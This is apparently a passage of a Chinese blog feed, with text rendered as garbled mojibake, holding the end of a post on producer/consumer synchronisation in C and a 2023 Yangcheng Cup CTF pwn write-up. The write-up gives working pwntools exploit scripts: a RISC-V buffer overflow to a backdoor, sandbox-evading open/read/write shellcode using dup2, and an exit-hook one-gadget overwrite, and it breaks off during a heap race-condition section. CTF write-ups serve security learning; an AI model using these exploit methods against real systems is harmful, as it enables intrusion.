count++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">    mutex_unlock(&amp;lk);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Tconsume</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">  retry:</span><br><span class="line">    mutex_lock(&amp;lk);</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;<span class="comment">//ç¼“å†²åŒºä¸ºç©º</span></span><br><span class="line">      mutex_unlock(&amp;lk);</span><br><span class="line">      <span class="keyword">goto</span> retry;</span><br><span class="line">    &#125;</span><br><span class="line">    count--;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">    mutex_unlock(&amp;lk);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  assert(argc == <span class="number">2</span>);</span><br><span class="line">  n = atoi(argv[<span class="number">1</span>]);<span class="comment">//ç¼“å†²åŒºå¤§å°</span></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">    create(Tproduce);</span><br><span class="line">    create(Tconsume);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‹åŠ›æµ‹è¯•è„šæœ¬ pc-check.py </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">limit = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">count, n = <span class="number">0</span>, <span class="number">100000</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> sys.stdin.read(n):</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="string">&#x27;(&#x27;</span>: count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="string">&#x27;)&#x27;</span>: count -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="number">0</span> &lt;= count &lt;= limit<span class="comment">#æ¶ˆè´¹è€…ä¸ä¼šå¤šå–</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n&#125;</span> Ok.&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/N/p6&gt; ./a.out 10 | python pc-check.py 10</span><br><span class="line">100000 Ok.</span><br><span class="line">100000 Ok.</span><br><span class="line">100000 Ok.</span><br><span class="line">100000 Ok.</span><br></pre></td></tr></table></figure><h2 id="ä¿¡å·é‡å®ç°ç”Ÿäº§è€…-x2F-æ¶ˆè´¹è€…"><a href="#ä¿¡å·é‡å®ç°ç”Ÿäº§è€…-x2F-æ¶ˆè´¹è€…" class="headerlink" title="ä¿¡å·é‡å®ç°ç”Ÿäº§è€…&#x2F;æ¶ˆè´¹è€…"></a>ä¿¡å·é‡å®ç°ç”Ÿäº§è€…&#x2F;æ¶ˆè´¹è€…</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sem_wait</span><span class="params">(<span class="type">sem_t</span> *sem)</span>;</span><br><span class="line">ä¿¡å·é‡semå‡ä¸€ï¼Œå¦‚æœç»“æœå¤§äº<span class="number">0</span>ç›´æ¥è¿”å›ï¼Œå¦åˆ™é˜»å¡åˆ°semèƒ½å¤Ÿå‡ä¸€å³ç­‰å¾…ç›´åˆ°æœ‰å…¶å®ƒçº¿ç¨‹å¢åŠ äº†è¿™ä¸ªå€¼ä½¿å®ƒä¸å†æ˜¯<span class="number">0</span>ä¸ºæ­¢</span><br><span class="line"><span class="type">int</span> <span class="title function_">sem_post</span><span class="params">(<span class="type">sem_t</span> *sem)</span>; </span><br><span class="line">ä¿¡å·é‡semåŠ ä¸€ï¼Œå”¤é†’ä¸€ä¸ªè¯¥ä¿¡å·é‡é˜»å¡çš„çº¿ç¨‹</span><br></pre></td></tr></table></figure><p><strong>ä¿¡å·é‡å®ç°é”</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">sem_t</span> m;</span><br><span class="line">sem_init(&amp;m, <span class="number">0</span>, <span class="number">1</span>); </span><br><span class="line"></span><br><span class="line">sem_wait(&amp;m);</span><br><span class="line"><span class="comment">// critical section here</span></span><br><span class="line">sem_post(&amp;m);</span><br></pre></td></tr></table></figure><p><strong>ä¿¡å·é‡å®ç°æ¡ä»¶å˜é‡</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">sem_t</span> m;</span><br><span class="line">sem_init(&amp;m, <span class="number">0</span>, <span class="number">0</span>); </span><br><span class="line">sem_wait(&amp;s);<span class="comment">//é˜»å¡è¯¥çº¿ç¨‹ç­‰å¾…æŸä¸ªçº¿ç¨‹ç¨‹æ‰§è¡Œsem_post(&amp;s);å”¤é†’æ‰èƒ½ç»§ç»­å¾€ä¸‹æ‰§è¡Œ</span></span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p><strong>ç”Ÿäº§è€…&#x2F;æ¶ˆè´¹è€…</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">sem_t</span> empty;</span><br><span class="line"><span class="type">sem_t</span> full;</span><br><span class="line"><span class="type">sem_t</span> mutex;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">producer</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; loops; i++) &#123;</span><br><span class="line">    sem_wait(&amp;empty); <span class="comment">// line p1</span></span><br><span class="line">    sem_wait(&amp;mutex); <span class="comment">// line p1.5 (MOVED MUTEX HERE...)</span></span><br><span class="line">    put(i);           <span class="comment">// line p2</span></span><br><span class="line">    sem_post(&amp;mutex); <span class="comment">// line p2.5 (... AND HERE)</span></span><br><span class="line">    sem_post(&amp;full);  <span class="comment">// line p3</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">consumer</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; loops; i++) &#123;</span><br><span class="line">    sem_wait(&amp;full);  <span class="comment">// line c1</span></span><br><span class="line">    sem_wait(&amp;mutex); <span class="comment">// line c1.5 (MOVED MUTEX HERE...)</span></span><br><span class="line">    <span class="type">int</span> tmp = get();  <span class="comment">// line c2</span></span><br><span class="line">    sem_post(&amp;mutex); <span class="comment">// line c2.5 (... AND HERE)</span></span><br><span class="line">    sem_post(&amp;empty); <span class="comment">// line c3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, tmp);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  sem_init(&amp;empty, <span class="number">0</span>, MAX); <span class="comment">// MAX buffers are empty to begin with...</span></span><br><span class="line">  sem_init(&amp;full, <span class="number">0</span>, <span class="number">0</span>);    <span class="comment">// ... and 0 are full</span></span><br><span class="line">  sem_init(&amp;mutex, <span class="number">0</span>, <span class="number">1</span>);   <span class="comment">// mutex=1 because it is a lock</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 ç¾ŠåŸæ¯</title>
      <link href="/2023/09/07/2023-ycb/"/>
      <url>/2023/09/07/2023-ycb/</url>
      
        <content type="html"><![CDATA[<p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1_1KIhSyo5p8qDfCraXSh5Q">https://pan.baidu.com/s/1_1KIhSyo5p8qDfCraXSh5Q</a><br>æå–ç ï¼šn05i</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>risc-v pwnï¼Œç»™äº†åé—¨ï¼Œå¯ä»¥ç”¨cat fl*ç»•è¿‡</p><p>size_tçš„sVar1è¢«byteæˆªæ–­å­˜åœ¨æº¢å‡ºï¼Œæ¯”å¦‚0x107è¢«byteæˆªæ–­0x07</p><p><img src="/2023/09/07/2023-ycb/image-20230907232659311.png" alt="image-20230907232659311"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;riscv&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="meta"># io=process([<span class="string">&quot;qemu-riscv64&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/riscv64-linux-gnu/&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])#è°ƒè¯•</span></span><br><span class="line">    io=process([<span class="string">&quot;qemu-riscv64&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/riscv64-linux-gnu/&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])<span class="meta">#</span></span><br><span class="line"><span class="meta">r = lambda x: io.recv(x)</span></span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = lambda x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">def find_libc(func_name,func_ad):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    global libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">padding=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">256</span></span><br><span class="line">backdor=<span class="number">0x123456ee</span></span><br><span class="line">payload=flat(padding,backdor)</span><br><span class="line">sa(b<span class="number">&#x27;</span> name:<span class="string">&#x27;,b&#x27;</span>gr<span class="number">&#x27;</span>)</span><br><span class="line">sa(b<span class="number">&#x27;</span>words<span class="number">&#x27;</span>,payload)</span><br><span class="line">sa(b<span class="number">&#x27;</span>exec<span class="number">&#x27;</span>,b<span class="number">&#x27;</span>cat fl*<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">io.interactive()</span></span><br></pre></td></tr></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>å¼€äº†æ²™ç®±ï¼Œé™åˆ¶äº†readçš„fdè¦&lt;&#x3D;2ï¼Œwriteçš„fdå¿…é¡»å¤§äº2ï¼Œæ‰€å¹¸å¯ä»¥ä½¿ç”¨dup2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0000:Â 0x20Â 0x00Â 0x00Â 0x00000004Â Â AÂ =Â arch</span><br><span class="line">0001:Â 0x15Â 0x00Â 0x12Â 0xc000003eÂ Â ifÂ (AÂ !=Â ARCH_X86_64)Â gotoÂ 0020</span><br><span class="line">0002:Â 0x20Â 0x00Â 0x00Â 0x00000000Â Â AÂ =Â sys_number</span><br><span class="line">0003:Â 0x35Â 0x00Â 0x01Â 0x40000000Â Â ifÂ (AÂ &lt;Â 0x40000000)Â gotoÂ 0005</span><br><span class="line">0004:Â 0x15Â 0x00Â 0x0fÂ 0xffffffffÂ Â ifÂ (AÂ !=Â 0xffffffff)Â gotoÂ 0020</span><br><span class="line">0005:Â 0x15Â 0x0dÂ 0x00Â 0x00000002Â Â ifÂ (AÂ ==Â open)Â gotoÂ 0019</span><br><span class="line">0006:Â 0x15Â 0x0cÂ 0x00Â 0x00000021Â Â ifÂ (AÂ ==Â dup2)Â gotoÂ 0019</span><br><span class="line">0007:Â 0x15Â 0x00Â 0x05Â 0x00000000Â Â ifÂ (AÂ !=Â read)Â gotoÂ 0013</span><br><span class="line">0008:Â 0x20Â 0x00Â 0x00Â 0x00000014Â Â AÂ =Â fdÂ &gt;&gt;Â 32Â #Â read(fd,Â buf,Â count)</span><br><span class="line">0009:Â 0x25Â 0x0aÂ 0x00Â 0x00000000Â Â ifÂ (AÂ &gt;Â 0x0)Â gotoÂ 0020</span><br><span class="line">0010:Â 0x15Â 0x00Â 0x08Â 0x00000000Â Â ifÂ (AÂ !=Â 0x0)Â gotoÂ 0019</span><br><span class="line">0011:Â 0x20Â 0x00Â 0x00Â 0x00000010Â Â AÂ =Â fdÂ #Â read(fd,Â buf,Â count)</span><br><span class="line">0012:Â 0x25Â 0x07Â 0x06Â 0x00000002Â Â ifÂ (AÂ &gt;Â 0x2)Â gotoÂ 0020Â elseÂ gotoÂ 0019</span><br><span class="line">0013:Â 0x15Â 0x00Â 0x06Â 0x00000001Â Â ifÂ (AÂ !=Â write)Â gotoÂ 0020</span><br><span class="line">0014:Â 0x20Â 0x00Â 0x00Â 0x00000014Â Â AÂ =Â fdÂ &gt;&gt;Â 32Â #Â write(fd,Â buf,Â count)</span><br><span class="line">0015:Â 0x25Â 0x03Â 0x00Â 0x00000000Â Â ifÂ (AÂ &gt;Â 0x0)Â gotoÂ 0019</span><br><span class="line">0016:Â 0x15Â 0x00Â 0x03Â 0x00000000Â Â ifÂ (AÂ !=Â 0x0)Â gotoÂ 0020</span><br><span class="line">0017:Â 0x20Â 0x00Â 0x00Â 0x00000010Â Â AÂ =Â fdÂ #Â write(fd,Â buf,Â count)</span><br><span class="line">0018:Â 0x25Â 0x00Â 0x01Â 0x00000002Â Â ifÂ (AÂ &lt;=Â 0x2)Â gotoÂ 0020</span><br><span class="line">0019:Â 0x06Â 0x00Â 0x00Â 0x7fff0000Â Â returnÂ ALLOW</span><br><span class="line">0020:Â 0x06Â 0x00Â 0x00Â 0x00000000Â Â returnÂ KILL</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ‰§è¡Œæˆ‘ä»¬è¾“å…¥çš„shellcodeï¼Œæœ€é•¿17ä¸ªå­—èŠ‚ï¼ŒshellcodeèŒƒå›´åœ¨[0x4F,0x5f]ï¼Œä½†æ˜¯æœ€åä¸€bit shellcodeæ²¡æœ‰æ£€æµ‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./shellcode&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x14F2&#x27;)</span></span><br><span class="line">sa(<span class="string">b&#x27;no)&#x27;</span>,asm(<span class="string">&#x27;syscall&#x27;</span>))</span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rax#fake padding</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax#0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">pop rsi#0x7ffd451d99c0 â—‚â€” 0x50f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdi#0</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">pop rsp</span></span><br><span class="line"><span class="string">pop rdx#0x50f</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(asm(shellcode)))</span><br><span class="line">sa(<span class="string">b&#x27;===\n&#x27;</span>,asm(shellcode))</span><br><span class="line">orw_dup2=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">mov eax,2</span></span><br><span class="line"><span class="string">syscall #open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax,0x21</span></span><br><span class="line"><span class="string">mov rdi,0x3</span></span><br><span class="line"><span class="string">mov rsi,0x2</span></span><br><span class="line"><span class="string">syscall#dup2(3,2)</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 0x2</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rdx,0x30</span></span><br><span class="line"><span class="string">syscall #read(2,rsp,0x30)</span></span><br><span class="line"><span class="string">mov rax,0x21</span></span><br><span class="line"><span class="string">mov rdi,0x1</span></span><br><span class="line"><span class="string">mov rsi,0x5</span></span><br><span class="line"><span class="string">syscall#dup2(1,5)</span></span><br><span class="line"><span class="string">mov rax,0x1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdi,0x5</span></span><br><span class="line"><span class="string">syscall#write(5,rsp)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;aa&#x27;</span>+asm(orw_dup2))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="easy-vm"><a href="#easy-vm" class="headerlink" title="easy_vm"></a>easy_vm</h2><p> qword_201040é‡Œå«æœ‰æ®‹ä½™çš„unsortedbinï¼Œç¨‹åºå…·æœ‰ä»»æ„å†™ï¼Œå¯ä»¥åˆ©ç”¨åç§»ç¡®è®¤oggï¼Œå†™exithook</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x9A4 &#x27;)#3</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x0ABC&#x27;)#exit</span></span><br><span class="line">ogg=[<span class="number">0x45206</span>,<span class="number">0x4525a</span>,<span class="number">0xef9f4</span>,<span class="number">0xf0897</span>]</span><br><span class="line">code=flat(</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    <span class="number">7</span>,<span class="number">0x3c3b78</span>,<span class="comment">#libc_base</span></span><br><span class="line">    <span class="number">6</span>,ogg[<span class="number">3</span>],</span><br><span class="line">    <span class="number">1</span>,<span class="comment">#*(_QWORD *)qword_201040=ogg</span></span><br><span class="line">    <span class="number">7</span>,ogg[<span class="number">3</span>],</span><br><span class="line">    <span class="number">6</span>,<span class="number">0x626f48</span>,<span class="comment">#exit_hook=qword_201040=ogg</span></span><br><span class="line">    <span class="number">3</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sa(<span class="string">b&#x27;code:&#x27;</span>,code)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><p>å¤šçº¿ç¨‹å †é¢˜ï¼Œæ¯ä¸ªæ“ä½œéƒ½ä¼šèµ·ä¸€ä¸ªçº¿ç¨‹</p><p>æ¯ä¸ªpaperä¼šåˆ†é…ä¸€ä¸ª0x10ç®¡ç†ç»“æ„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">paper</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *content_ptr;</span><br><span class="line">  <span class="type">int</span> len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>edité‡Œå­˜åœ¨æ¡ä»¶ç«äº‰å¯¼è‡´çš„å †æº¢å‡ºï¼Œå¦‚æœæ­¤æ—¶edit paper-&gt;len&#x3D;0x68å¤§å°çš„paperï¼ŒsleepæœŸé—´ï¼Œè¿™ä¸ªpaperè¢«é‡Šæ”¾ï¼Œå¹¶ç”³è¯·äº†ä¸€ä¸ªé•¿åº¦ä¸º0x58å¤§å°çš„paper Bï¼Œpaper Bå°±å¯ä»¥é€ æˆ0x10å¤§å°çš„å †æº¢å‡ºï¼Œå¯ä»¥è¦†ç›–æ‰ä¸‹ä¸€ä¸ªpaper Cçš„ç®¡ç†ç»“æ„æ§åˆ¶content_ptrå®ç°æ³„éœ²åœ°å€å’Œä»»æ„åœ°å€å†™</p><p><img src="/2023/09/07/2023-ycb/image-20230908171035483.png" alt="image-20230908171035483"></p><p>å­è¿›ç¨‹åˆ†é…å †æ—¶ï¼Œåœ¨é¡µå¼€å§‹çš„0x8a0å¤„æ˜¯æŒ‡å‘main_arenaçš„æŒ‡é’ˆï¼Œå¯ä»¥ç”¨æ¥æ³„éœ²libc</p><p><img src="/2023/09/07/2023-ycb/image-20230908172332090.png" alt="image-20230908172332090"></p><p>strtokå‡½æ•°ä¼šè°ƒç”¨strspn_sse42å‡½æ•°</p><p><img src="/2023/09/07/2023-ycb/image-20230908181202295.png" 